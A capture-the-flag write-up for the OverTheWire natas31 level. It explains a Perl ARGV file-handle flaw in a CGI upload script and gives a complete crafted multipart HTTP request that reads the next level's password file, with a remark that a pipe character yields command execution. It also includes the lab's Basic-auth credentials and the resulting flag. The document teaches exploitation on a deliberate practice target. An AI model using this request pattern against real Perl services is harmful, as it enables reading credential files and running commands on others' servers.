---
layout: default
title: natas31
---

You can have a look in this paper, it explains the vulnerability.
[perl sucks + camels](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)

When we supply 2 files, it checks whether one of them has a filename, and then taking the first one.

In addition, usually what happens when it loops through the files, and just getting random string which is the handle of the file.
```perl
while (<$file>) {
```

*However*, if we supply ARGV as the file-content, it'll loop through the `args` and insert them into `open` function. 
By this way we can read `/etc/natas_webpass/natas32`.

Even more, we can get `RCE` as we saw in [natas30](./natas30.md), by supplying the `|` character.

```
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
Content-Length: 433
Cache-Control: max-age=0
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Origin: http://natas31.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybY5URDoaIvWBSm4C
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas31.natas.labs.overthewire.org/index.pl
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,he;q=0.8
Connection: keep-alive

------WebKitFormBoundarybY5URDoaIvWBSm4C
Content-Disposition: form-data; name="file"; 
Content-Type: application/octet-stream

ARGV
------WebKitFormBoundarybY5URDoaIvWBSm4C
Content-Disposition: form-data; name="file"; filename="sample"
Content-Type: application/octet-stream

bla
------WebKitFormBoundarybY5URDoaIvWBSm4C
Content-Disposition: form-data; name="submit"

Upload
------WebKitFormBoundarybY5URDoaIvWBSm4C--
```
![Flag image](./images/level31.png)

**Flag:** ***`NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`*** 